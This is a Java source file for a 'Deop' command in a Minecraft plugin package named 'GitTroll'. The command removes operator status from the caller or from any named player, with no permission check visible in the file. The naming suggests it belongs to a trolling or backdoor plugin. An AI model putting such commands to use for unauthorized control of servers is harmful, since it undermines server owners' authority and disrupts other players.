package net.Lenni0451.GitTroll.command.commands.player;

import java.util.List;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class Deop extends CommandBase {

	public Deop() {
		super("Deop", "Deop yourself or other players", "[Player]");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isLength(0)) {
			this.execute(executor, new ArrayHelper(args.advanceToStrings(executor.getPlayer().getName())));
		} else if(args.isLength(1)) {
			CustomPlayer vic = this.parsePlayer(args.getString(0), executor);
			
			if(!vic.getPlayer().isOp()) {
				if(vic.equals(executor)) {
					executor.sendGitMessage("§cYou are not opped.");
				} else {
					executor.sendGitMessage("§cThe player is not opped.");
				}
				return;
			}
			vic.getPlayer().setOp(false);
			if(vic.equals(executor)) {
				executor.sendGitMessage("You have been deopped.");
			} else {
				executor.sendGitMessage("The player has been deopped.");
			}
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {
		if(args.isEmpty()) {
			this.tabCompletePlayers(tabComplete);
		}
	}

}
